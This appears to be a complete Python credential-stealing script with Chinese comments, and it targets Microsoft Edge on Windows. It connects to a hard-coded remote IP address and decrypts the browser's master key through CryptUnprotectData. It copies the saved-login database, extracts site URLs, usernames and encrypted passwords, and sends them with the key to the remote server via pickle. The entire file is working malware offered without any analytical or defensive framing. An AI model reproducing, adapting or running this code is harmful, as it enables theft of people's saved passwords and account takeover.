import os
import shutil
import sqlite3
import json
import base64
import pickle
from win32crypt import CryptUnprotectData
from socket import socket

# 创建socket对象
s = socket()

# 连接到服务器
s.connect(('146.56.223.48', 2345))

# 准备浏览器的用户路径
browser_path = os.getenv('LOCALAPPDATA') + '\\Microsoft\\Edge\\User Data'

# 拿到key
with open(browser_path + '\\Local State', 'r', encoding='utf-8') as f:
    text = f.read()
    JSON = json.loads(text)
    key = base64.b64decode(JSON['os_crypt']['encrypted_key'])[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]

# 拿到网址账号密文
db_file = browser_path + '\\Default\\Login Data'
shutil.copy(db_file, 'Login Data')
conn = sqlite3.connect('Login Data')
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')

data_list = []
for data in cursor.fetchall():
    data = list(data)
    data.append(key)
    data_list.append(data)

# 发送数据
s.send(b'1')
response = s.recv(1024)
if response == b'ACK':
    s.send(pickle.dumps(data_list))
    response = s.recv(1024)
    if response == b'DONE':
        s.send(b'0')

# 关闭连接
s.close()